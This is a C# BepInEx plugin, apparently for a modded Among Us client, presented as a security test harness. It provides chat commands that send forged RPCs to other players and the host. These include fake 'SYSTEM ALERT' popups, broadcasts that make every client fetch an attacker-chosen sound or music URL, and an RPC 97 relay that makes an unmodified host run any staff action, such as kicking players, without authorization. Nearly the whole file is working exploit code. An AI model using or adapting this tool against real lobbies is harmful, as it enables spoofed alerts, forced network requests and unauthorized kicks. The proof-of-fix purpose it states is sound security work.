using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.ExceptionServices;
using BepInEx;
using BepInEx.Logging;
using BepInEx.Unity.IL2CPP;
using HarmonyLib;

namespace SystemAlertSpoof
{
    /// <summary>
    /// TEST HARNESS — chat-command driven. Run on a second (non-staff, non-host)
    /// game instance inside a lobby. Type in the normal in-game chat:
    ///
    ///     /xalert <message>     -> forged broadcast RPC 13 ("SYSTEM ALERT")
    ///     /xaudio <url>         -> forged broadcast RPC 94 (custom sound URL)
    ///     /xmusic <url>         -> forged broadcast RPC 89 (lobby-music URL)
    ///     /xstop                -> forged broadcast RPC 95 (stop all sounds)
    ///     /xrelay <name> [args] -> RPC 97 staff-action relay; the HOST executes
    ///                              whatever GameAction you name. Mapping of
    ///                              command names -> action ids comes from
    ///                              BepInEx/config/auad_relay_actions.txt
    ///                              (auto-created on first run; edit + /xreload).
    ///                              Examples:
    ///                                /xrelay kick <hostName>
    ///                                /xrelay alert hello world
    ///                                /xrelay countdown 10
    ///     /xlist [filter]       -> list the actions loaded from the config
    ///     /xreload              -> re-read the config file
    ///     /xhelp
    ///
    /// The RPC inbound handlers have NO sender validation:
    ///   RPC 13 -> "SYSTEM ALERT" popup on every client incl. the stock host
    ///   RPC 94 -> StaffCustomSoundPlayer.PlayFromUrl(url)  -> HTTP GET url
    ///   RPC 89 -> StaffLobbyMusicBroadcast.PlayFromUrl(url) -> HTTP GET url
    ///   RPC 95 -> StaffCustomSoundPlayer.StopAll()
    ///   RPC 97 -> host-only execution of any StaffTools.GameAction, no staff
    ///             check (verified in the 9.5 binary: handler reads the action
    ///             int + args and calls Dispatch directly after an AmHost gate).
    ///
    /// Nothing is patched in the game: the host instance must be a completely
    /// stock (unmodified) copy. Purpose: prove the exploits, then re-run after
    /// a fix to prove they are gone.
    ///
    /// v1.4 — config-driven relay + crash instrumentation:
    ///   * /xrelay action mapping pulled from BepInEx/config/auad_relay_actions.txt
    ///   * AppDomain unhandled/first-chance exception logging (PAL_SEH diagnosis)
    ///   * Harmony patching wrapped so a patch failure logs instead of aborting
    /// </summary>
    [BepInPlugin("auad.test.rpc13.chat", "RPC13 Chat Test Harness", "1.4.0")]
    public class Plugin : BasePlugin
    {
        internal static ManualLogSource Logger;

        public static string RelayConfigPath
        {
            get { return Path.Combine(Paths.ConfigPath, "auad_relay_actions.txt"); }
        }

        public override void Load()
        {
            Logger = Log;

            // Crash instrumentation: PAL_SEHException aborts mean a CoreCLR
            // exception escaped into a native (il2cpp) frame. These handlers
            // make sure we capture the managed seed if it ever happens again.
            try
            {
                AppDomain.CurrentDomain.UnhandledException += (s, e) =>
                {
                    try { Logger.LogError("[ChatHarness] UNHANDLED exception: " + e.ExceptionObject); }
                    catch { }
                };
                AppDomain.CurrentDomain.FirstChanceException += (s, e) =>
                {
                    try
                    {
                        var ex = e.Exception;
                        if (ex != null && (ex.StackTrace ?? string.Empty).Contains("SystemAlertSpoof"))
                            Logger.LogWarning("[ChatHarness] first-chance exception in harness code: " + ex);
                    }
                    catch { }
                };
            }
            catch (Exception e)
            {
                Logger.LogWarning("[ChatHarness] could not install crash handlers: " + e);
            }

            // Harmony patch — if the game's ChatController.SendChat can't be
            // resolved for some reason, log and continue (no abort).
            try
            {
                Harmony.CreateAndPatchAll(typeof(ChatCommandHook));
                Logger.LogInfo("[ChatHarness] SendChat hook installed.");
            }
            catch (Exception e)
            {
                Logger.LogError("[ChatHarness] Harmony patch failed (harness disabled): " + e);
            }

            RelayActions.Load();
            Logger.LogInfo("[ChatHarness] loaded v1.4. Commands: /xalert <msg> | /xaudio <url> | /xmusic <url> | /xstop | /xrelay <action> [args] | /xlist | /xreload | /xhelp"
                + "  — relay actions loaded: " + RelayActions.Count
                + " (config: " + RelayConfigPath + ")");
        }
    }

    /// <summary>
    /// Config store loaded from auad_relay_actions.txt. Two key namespaces:
    ///   name      = int   -> action-name map for /xrelay (StaffTools.GameAction id)
    ///   url.<tag> = <url> -> URL aliases for /xaudio /xmusic (so long links
    ///                        never have to be typed/pasted into the chat box)
    /// </summary>
    internal static class RelayActions
    {
        private static readonly Dictionary<string, int> Actions =
            new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);

        private static readonly Dictionary<string, string> Urls =
            new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        public static int Count
        {
            get { return Actions.Count; }
        }

        public static int UrlCount
        {
            get { return Urls.Count; }
        }

        public static void Load()
        {
            Actions.Clear();
            Urls.Clear();
            string path = Plugin.RelayConfigPath;
            try
            {
                if (!File.Exists(path))
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(path));
                    File.WriteAllText(path, RelayDefaults.Config);
                    Plugin.Logger.LogInfo("[ChatHarness] wrote default relay config -> " + path);
                }
                foreach (string raw in File.ReadAllLines(path))
                {
                    string line = raw.Trim();
                    if (line.Length == 0 || line.StartsWith("#", StringComparison.Ordinal))
                        continue;
                    int eq = line.IndexOf('=');
                    if (eq < 0) continue;
                    string key = line.Substring(0, eq).Trim();
                    string val = line.Substring(eq + 1).Trim();
                    if (key.Length == 0 || val.Length == 0) continue;
                    if (key.StartsWith("url.", StringComparison.OrdinalIgnoreCase))
                    {
                        Urls[key.Substring(4).Trim()] = val; // value may contain '=' or '#' — keep whole
                    }
                    else
                    {
                        int id;
                        if (int.TryParse(val, out id))
                            Actions[key] = id;
                    }
                }
            }
            catch (Exception e)
            {
                Plugin.Logger.LogError("[ChatHarness] failed to read relay config '" + path + "': " + e);
            }
        }

        public static bool TryGetAction(string name, out int id)
        {
            return Actions.TryGetValue(name, out id);
        }

        public static bool TryGetUrl(string tag, out string url)
        {
            return Urls.TryGetValue(tag, out url);
        }

        public static List<string> MatchActions(string filter)
        {
            var res = new List<string>();
            foreach (var kv in Actions)
                if (filter.Length == 0 || kv.Key.IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0)
                    res.Add(kv.Key + " = " + kv.Value);
            res.Sort(StringComparer.OrdinalIgnoreCase);
            return res;
        }

        public static List<string> MatchUrls(string filter)
        {
            var res = new List<string>();
            foreach (var kv in Urls)
                if (filter.Length == 0 || kv.Key.IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0)
                    res.Add("url." + kv.Key + " = " + kv.Value);
            res.Sort(StringComparer.OrdinalIgnoreCase);
            return res;
        }
    }

    [HarmonyPatch(typeof(ChatController), nameof(ChatController.SendChat))]
    public static class ChatCommandHook
    {
        private const string CmdPrefix = "/x";

        // Guards against re-entrancy: if a game call made below somehow
        // re-enters SendChat, pass it straight through instead of recursing.
        [ThreadStatic]
        private static bool _inside;

        private static bool Prefix(ChatController __instance)
        {
            if (_inside)
                return true;

            _inside = true;
            try
            {
                var box = __instance.TextArea;
                if (box == null)
                    return true;

                string raw = box.text ?? string.Empty;
                string trimmed = raw.TrimStart();

                if (trimmed.StartsWith("/", StringComparison.Ordinal))
                    Plugin.Logger.LogInfo("[ChatHarness] SendChat sees '/'-led text: " + repr(raw));

                if (!trimmed.StartsWith(CmdPrefix, StringComparison.Ordinal))
                    return true; // normal chat — do nothing

                Plugin.Logger.LogInfo("[ChatHarness] recognized test command -> " + repr(trimmed));

                bool sent = TryHandle(trimmed);
                if (!sent)
                {
                    // Failed to consume cleanly: leave text in the box and let
                    // the original SendChat run (worst case: goes out as chat).
                    Plugin.Logger.LogWarning("[ChatHarness] command not consumed — passing through to normal send.");
                    return true;
                }

                try
                {
                    box.Clear();
                }
                catch (Exception e)
                {
                    Plugin.Logger.LogError("[ChatHarness] box.Clear() failed (non-fatal): " + e);
                }
                return false; // skip the real send
            }
            catch (Exception e)
            {
                Plugin.Logger.LogError("[ChatHarness] prefix error: " + e);
                return true; // never break the game's normal chat
            }
            finally
            {
                _inside = false;
            }
        }

        private static bool TryHandle(string line)
        {
            // Re-read the config on every /x command so external edits to
            // auad_relay_actions.txt are picked up without /xreload.
            try { RelayActions.Load(); } catch { }

            var toks = Tokenize(line);
            if (toks.Count == 0) return true;
            string cmd = toks[0].ToLowerInvariant();

            switch (cmd)
            {
                case "/xhelp":
                    Plugin.Logger.LogInfo("[ChatHarness] /xalert <msg> — RPC 13 SYSTEM ALERT. /xaudio <url> — RPC 94 custom sound. /xmusic <url> — RPC 89 lobby music. /xstop — RPC 95 stop. /xrelay <action> [args] — RPC 97 staff relay (host executes). /xlist — loaded relay actions. /xreload — reload config.");
                    return true;

                case "/xaudio":
                {
                    string url = ResolveUrl(Arg(line));
                    if (url == null) return true; // unresolved alias — already warned
                    return BroadcastSound(url, 94, "custom sound");
                }

                case "/xmusic":
                {
                    string url = ResolveUrl(Arg(line));
                    if (url == null) return true; // unresolved alias — already warned
                    return BroadcastSound(url, 89, "lobby music");
                }

                case "/xstop":
                    return BroadcastSound(null, 95, "stop-all");

                case "/xlist":
                {
                    string filter = Arg(line);
                    var hits = RelayActions.MatchActions(filter);
                    var urls = RelayActions.MatchUrls(filter);
                    if (hits.Count == 0 && urls.Count == 0)
                        Plugin.Logger.LogWarning("[ChatHarness] nothing matches '" + filter + "' (" + RelayActions.Count + " actions, " + RelayActions.UrlCount + " url aliases loaded).");
                    else
                    {
                        foreach (string h in hits)
                            Plugin.Logger.LogInfo("    " + h);
                        foreach (string u in urls)
                            Plugin.Logger.LogInfo("    " + u);
                        Plugin.Logger.LogInfo("[ChatHarness] " + (hits.Count + urls.Count) + " entries matching '" + filter + "'.");
                    }
                    return true;
                }

                case "/xreload":
                    RelayActions.Load();
                    Plugin.Logger.LogInfo("[ChatHarness] relay config reloaded: " + RelayActions.Count + " actions.");
                    return true;

                case "/xalert":
                {
                    string msg = Arg(line);
                    if (msg.Length == 0)
                    {
                        Plugin.Logger.LogWarning("[ChatHarness] usage: /xalert <message>");
                        return true;
                    }
                    if (PlayerControl.LocalPlayer == null)
                    {
                        Plugin.Logger.LogWarning("[ChatHarness] LocalPlayer is null — must be inside a lobby/game first.");
                        return true;
                    }
                    try
                    {
                        Plugin.Logger.LogInfo("[ChatHarness] Sending forged broadcast RPC 13 (fake SYSTEM ALERT): \"" + msg + "\"");
                        PlayerControl.LocalPlayer.RpcBroadcastSystemAlert(msg);
                        return true;
                    }
                    catch (Exception e)
                    {
                        Plugin.Logger.LogError("[ChatHarness] RpcBroadcastSystemAlert threw: " + e);
                        return false; // don't consume — send as plain chat
                    }
                }

                case "/xrelay":
                    return SendRelay(toks);

                default:
                    Plugin.Logger.LogWarning("[ChatHarness] unknown test command: " + cmd + "  (try /xhelp)");
                    return true;
            }
        }

        /// <summary>
        /// Fire RPC 97 (StaffHostActionRelay) with the exact wire format the
        /// game's own RelayToHost() uses (verified in the 9.5 binary @0x119d730):
        ///   StartRpc(netId, 97, Reliable)
        ///   Write(int32 actionId) Write(string) Write(byte argc) Write(string)*argc
        /// The host receiver (@0x119da90) gates on AmHost only — no staff check —
        /// then Dispatch()es the action with these args.
        /// </summary>
        private static bool SendRelay(List<string> toks)
        {
            if (toks.Count < 2)
            {
                Plugin.Logger.LogWarning("[ChatHarness] usage: /xrelay <action> [args...]   (/xlist shows loaded actions)");
                return true;
            }
            int actionId;
            if (!RelayActions.TryGetAction(toks[1], out actionId))
            {
                int parsed;
                if (int.TryParse(toks[1], out parsed))
                    actionId = parsed; // raw numeric id also accepted
                else
                {
                    Plugin.Logger.LogWarning("[ChatHarness] unknown relay action '" + toks[1] + "' — /xlist shows the config names.");
                    return true;
                }
            }

            var args = new List<string>();
            for (int i = 2; i < toks.Count; i++) args.Add(toks[i]);
            if (args.Count > 20)
            {
                Plugin.Logger.LogWarning("[ChatHarness] too many args for /xrelay (max 20).");
                return true;
            }

            var me = PlayerControl.LocalPlayer;
            var client = AmongUsClient.Instance;
            if (me == null || client == null)
            {
                Plugin.Logger.LogWarning("[ChatHarness] must be inside a lobby/game (LocalPlayer/AmongUsClient null).");
                return true;
            }
            try
            {
                string label = me.name ?? "harness";
                Plugin.Logger.LogInfo("[ChatHarness] RPC 97 relay: action=" + actionId + " label=\"" + label + "\" args=[" + string.Join("|", args.ToArray()) + "] -> host executes it.");
                var writer = client.StartRpc(me.NetId, 97, Hazel.SendOption.Reliable);
                writer.Write(actionId);
                writer.Write(label);
                writer.Write((byte)args.Count);
                foreach (string a in args) writer.Write(a);
                writer.EndMessage();
                Plugin.Logger.LogInfo("[ChatHarness] RPC 97 sent. The HOST will execute GameAction " + actionId + " with args [" + string.Join("|", args.ToArray()) + "] — watch the stock host.");
                return true;
            }
            catch (Exception e)
            {
                Plugin.Logger.LogError("[ChatHarness] RPC 97 send threw: " + e);
                return false;
            }
        }

        /// <summary>Broadcast a sound RPC the same way the game does.</summary>
        private static bool BroadcastSound(string url, byte callId, string label)
        {
            var me = PlayerControl.LocalPlayer;
            if (me == null)
            {
                Plugin.Logger.LogWarning("[ChatHarness] " + label + ": LocalPlayer is null — inside a lobby/game first.");
                return true;
            }
            if (callId != 95 && (url == null || url.Trim().Length == 0))
            {
                Plugin.Logger.LogWarning("[ChatHarness] " + label + ": usage: /xaudio <http(s) url>  (or /xmusic <url>)");
                return true;
            }
            try
            {
                var client = AmongUsClient.Instance;
                if (client == null)
                {
                    Plugin.Logger.LogWarning("[ChatHarness] " + label + ": AmongUsClient.Instance is null.");
                    return true;
                }
                Plugin.Logger.LogInfo("[ChatHarness] Broadcasting RPC " + callId + " (" + label + "): " + (url ?? "<no payload>"));
                var writer = client.StartRpc(me.NetId, callId, Hazel.SendOption.Reliable);
                if (callId == 94 || callId == 89)
                    writer.Write(url);
                writer.EndMessage();
                Plugin.Logger.LogInfo("[ChatHarness] RPC " + callId + " sent. Stock receivers will now act on it.");
                return true;
            }
            catch (Exception e)
            {
                Plugin.Logger.LogError("[ChatHarness] " + label + " broadcast threw: " + e);
                return false;
            }
        }

        /// <summary>
        /// Turn the user's argument into a URL: a full http(s) link passes
        /// through as-is; anything else is looked up as a url.<tag> alias from
        /// the config file (so long links never have to fit in the chat box).
        /// Returns null when the arg is an unknown alias (already warned).
        /// </summary>
        private static string ResolveUrl(string arg)
        {
            if (arg.Length == 0) return arg;
            string low = arg.ToLowerInvariant();
            if (low.StartsWith("http://", StringComparison.Ordinal) || low.StartsWith("https://", StringComparison.Ordinal))
                return arg;
            string url;
            if (RelayActions.TryGetUrl(arg, out url))
                return url;
            Plugin.Logger.LogWarning("[ChatHarness] '" + arg + "' is not an http(s) url and no url alias matches. Add a line  url." + arg
                + " = <url>  to " + Plugin.RelayConfigPath + "  (then just type /xaudio " + arg + "), or pass a full http(s) url.");
            return null;
        }

        private static string Arg(string line)
        {
            var t = Tokenize(line);
            if (t.Count < 2) return string.Empty;
            var sb = new System.Text.StringBuilder();
            for (int i = 1; i < t.Count; i++)
            {
                if (i > 1) sb.Append(' ');
                sb.Append(t[i]);
            }
            return sb.ToString();
        }

        /// <summary>Whitespace tokenizer with "quoted arg" support.</summary>
        private static List<string> Tokenize(string s)
        {
            var list = new List<string>();
            int i = 0;
            while (i < s.Length)
            {
                while (i < s.Length && char.IsWhiteSpace(s[i])) i++;
                if (i >= s.Length) break;
                if (s[i] == '"')
                {
                    int j = s.IndexOf('"', i + 1);
                    if (j < 0) { list.Add(s.Substring(i + 1)); break; }
                    list.Add(s.Substring(i + 1, j - i - 1));
                    i = j + 1;
                }
                else
                {
                    int j = i;
                    while (j < s.Length && !char.IsWhiteSpace(s[j])) j++;
                    list.Add(s.Substring(i, j - i));
                    i = j;
                }
            }
            return list;
        }

        private static string repr(string s)
        {
            if (s == null) return "<null>";
            return "\"" + (s.Length > 60 ? s.Substring(0, 60) + "..." : s) + "\"";
        }
    }
}
